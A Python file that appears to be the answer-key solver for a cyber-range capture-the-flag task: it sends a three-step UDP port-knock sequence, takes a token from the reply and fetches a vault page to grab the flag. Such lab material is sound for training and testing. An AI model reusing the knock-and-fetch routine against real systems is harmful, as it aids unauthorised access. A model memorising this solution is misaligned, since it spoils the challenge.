"""Intended-path solver: UDP knock sequence, then vault fetch."""

import re
import socket
import urllib.parse

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

KNOCKS = ((7000, b"knock1"), (8000, b"knock2"), (9000, b"knock3"))
TOKEN_RE = re.compile(r"TOKEN=([0-9a-fA-F]+)")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host = urllib.parse.urlsplit(ctx.url("target")).hostname or "target"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    replies: list[str] = []
    token = None
    try:
        for port, payload in KNOCKS:
            sock.sendto(payload, (host, port))
            data, _addr = sock.recvfrom(2048)
            replies.append(data.decode(errors="replace"))
        match = TOKEN_RE.search(replies[-1])
        token = match.group(1) if match else None
    except OSError as exc:
        replies.append(f"udp error: {exc}")
    finally:
        sock.close()

    captured = None
    detail = None
    if token is None:
        detail = f"no token from knock sequence: {' | '.join(replies)[:200]}"
    else:
        try:
            res = httpx.get(f"{ctx.url('target')}/vault/{token}", timeout=10)
        except httpx.HTTPError as exc:
            detail = f"vault request failed: {exc}"
        else:
            flags = find_flags(res.text)
            captured = flags[0] if flags else None
            if not captured:
                detail = "vault page did not contain a flag"
    return SolveResult(
        results=[
            TaskResult(
                task_id="crack-the-gate",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
